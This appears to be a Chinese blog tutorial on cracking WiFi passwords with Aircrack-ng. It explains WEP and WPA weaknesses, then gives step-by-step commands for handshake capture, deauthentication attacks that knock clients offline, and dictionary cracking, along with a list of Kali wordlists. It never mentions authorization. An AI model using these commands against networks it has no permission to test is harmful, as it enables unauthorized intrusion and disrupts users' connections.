---
title: "Aircrack Pentest Wifi"
date: 2022-03-18T17:23:51+08:00
draft: false
weight: 9
categories: ["安全工具"]
tags: ["Wifi", "aircrack", "安全工具"]
author: ["lavaicer"]
# author: ["Me", "You"] # multiple authors
---
使用 Aircrack-ng 破解 WiFi

Aircrack-ng 是无线渗透利器，本文简单介绍了其基本使用 ———— 做一名无线黑客吧！

![](https://raw.githubusercontent.com/lavaicer/Img/main/20191102181301.png)

## 原理：无线网络的加密方式和破解方式

### 1、WEP 加密及破解

1）、WEP 加密方式

有线等效保密（wired euivalent pricacy,WEP)协议的使用 RC4（rivest cipher4)串流加密技术保障机密性，并使用 CRC-32 校验和保密资料的正确性，包含开放式系统认证和共建认证。

2）WEP 漏洞及破解

（1）802.2 头消息和简单 RC4 流密码算法。导致攻击者在有客户端并有大量有效通信时，可以分析出 WEP 的密码

（2）重复使用。导致攻击者在有客户端少量通信或者没有通信时。可以使用 ARP 重复的方法获取大量有效的数据。

（3）无身份验证机制，使用线性函数 CRC-32 进行完整性校验。导致攻击者能使用虚连接和 AP 建立伪连接，进而获得 XOR 文件。使用线性函数 CRC-32 进行完整性校验，导致攻击者用 XOR 文件伪造一个 ARP 的包，然后依靠这个包去捕获大量有效数据。

**破解 WEP 加密的无线信号依赖两个元素：**

1)信号强度

2)是否有在线客户端。通过抓包、注入，然后获取密码，只要有这类信号就是百分之百可以破解的。

### 2、WPE 加密方式

WPA 加密方式 WPA 全程为 WiFi protected access，既 Wif 网络安全存取，有 WPA 和 WPA2 两个标准，是基于有线等效加密中几个严重的弱点而产生的。WPA 加密方式目前有四种认证方式:WPA、WPA-PSK、WPA2、WPA2-PSK。

WAP 加密流程如下：

⑴ 无线 AP 定期发送 beacon 数据包，使无线终端更新自己的无线网络列表。

(2）无线终端在每个信道(1~13)广播 Probe Request(非隐藏类型的 Wif 含 ESSID，隐藏类型的 wif 不含 ESSID)。

(3）每个信道的 AP 回应，ProbeResponse，包含 ESSID 及 RSN 信息。

(4）无线终端给目标 AP 发送 AUTH 包。AUTH 认证类型有两种︰0 为开放式，1 为共享式(WPA/WPA2 必须是开放式)。

(5) AP 回应网卡 AUTH 包。

(6）无线终端向 AP 发送关联请求包 Association Request 数据包。

(7）AP 向无线终端发送关联响应包 Association Request 数据包。

(8) EAPOL 四次握手进行认证（握手包是破解的关键)。

(9） 完成认证可以上网

2）WPA 破解

WPA 的 wifi 密码破解分两种方法，抓包和跑 pin 码

（1） 抓包破解。wifi 信号的机密的。登录无线路由器，就要向路由器发送一个请求，请求和无线路由器建立连接，这个请求就是一个包，名叫握手包，这个包里面包含了发送过去的一个密码，但是这个密码是加密的。抓包破解成功与否取决于四个方面：信号强度、是否有客户端在线、跑包的机器是否足够强大、密码本是否好用等等

（2）跑 pin 码破解。WPS（QSS 或 AOSS）功能是 wifi 保护设置的英文缩写。对于一般用户，WPS 提供了一种相当简便的机密方法，通过该功能，不仅可将具有 WPS 功能的 wifi 设备和无线路由器进行快速连接，还会随机产生一个八位数的字符串作为个人识别号码（pin)进行机密操作，省去了客户端需要连接如无线网络时，必须手动添加网络名称（SSID）及输入冗长的无线加密密码的繁琐过程

## 准备：

### 1、载入无线网卡

`sudo airmon-ng` 查看，开启后无法连接``wifi`，使用后需要关闭监听模式

### 2、激活网线网卡

`sudo airmon-ng check kill` 杀掉影响启动的进程

`sudo airmon-ng start wlan0`

### 3、探测无线网络，抓取数据包

```bash

sudo airodump-ng --ivs -w longas wlan0mon


- 参数解释

-w: 保存探测文件的文件名

-wlan0mon:  之前已经开启监听的网卡名

-ivs: 这里的设置是通过过滤，不再将所有的无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小


- 上面的列表：

BSSID: 无线 AP 的硬件地址

PWR: 信号强度，值是负数，绝对值越小表示信号越强

Data：是对应的路由器的在线数据吞吐量，数字越大，数据上传量越大

CH: 无线网络信道

ENC: 加密方式，我们要破解的是 WPA2

ESSID: 无线网络的名称

- 第二个列表

BSSID: 无线 AP 的硬件地址

STATION: 用户设备的硬件地址


- 使用参数过滤列表，确定目标

airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称>


Enter 后不要关闭，新开一个shell执行其它操作，如果不能看清就 `两次 q ` 方便

```

### 4、`deauth` 攻击加速破解过程

```bash

aireplay-ng -<攻击模式> <攻击次数> -a <AP_MAC> -c <正连接AP的客户端的MAC> <wlan0mon>

```

然后回到抓取数据包的界面。在右上角出现 handshake 的提示证明获得了包含 WPA-PSK 密码的握手数据报文。如未出现，再次执行上述步骤

## 破解 WPA-PSK

`aircrack-ng -w dict.txt 捕获的.cap`

## 无线网卡退出监听模式

`sudo airmon-ng stop wlan0mon`

## 字典

```

关于kali系统自带字典目录wordlists

路径：/usr/share/wordlists/


dirb

big.txt #大的字典

small.txt #小的字典

catala.txt #项目配置字典

common.txt #公共字典

euskera.txt #数据目录字典

extensions_common.txt #常用文件扩展名字典

indexes.txt #首页字典

mutations_common.txt #备份扩展名

spanish.txt #方法名或库目录

others #扩展目录，默认用户名等

stress #压力测试

vulns #漏洞测试


dirbuster

apache-user-enum-** [[apache]]用户枚举

directories.jbrofuzz #目录枚举

directory-list-1.0.txt #目录列表大，中，小 big，medium，small


fern-wifi

common.txt [[公共wifi]]账户密码


metasploit

… #各种类型的字典


webslayer

general #普通字典目录

admin-panels.txt #后台路径 字典

….


Injections #注入字典目录

All_attack.txt #全部攻击

bad_chars.txt #字符注入

SQL.txt [[sql]]注入

Traversal.txt #路径回溯

XML.txt [[xml]]注入

XSS.txt [[xxs]]注入


others #扩展目录

common_pass.txt #通用密码字典

names.txt #用户名字典


stress #压力测试目录


vulns #漏洞测试目录

apache、iis、cgis…


webservicces [[web]]服务目录

ws-dirs.txt #路径测试

ws-files.txt #文件测试


wfuzz #模糊测试，各种字典…

```

GitHub => https://github.com/conwnet/wpa-dictionary

`aircrack-ng` 教程：

官方 => https://www.aircrack-ng.org/doku.php?id=getting_started

中文教程 => https://www.wangan.com/docs/1344

参考文章：[在这里这一篇](https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651133741&idx=1&sn=cc0e3b210f5782e17f4755624614773e&chksm=bd1e85a68a690cb05fb447aff1c9401371bc3feb97692d0c51bf62a72e81ce4e8deee821b46a&mpshare=1&scene=23&srcid=0816ggi6DwuQlsRUahcJkVAQ&sharer_sharetime=1630052407627&sharer_shareid=82a2a446beb6b7db6a97fc0a9bf8d74c#rd)
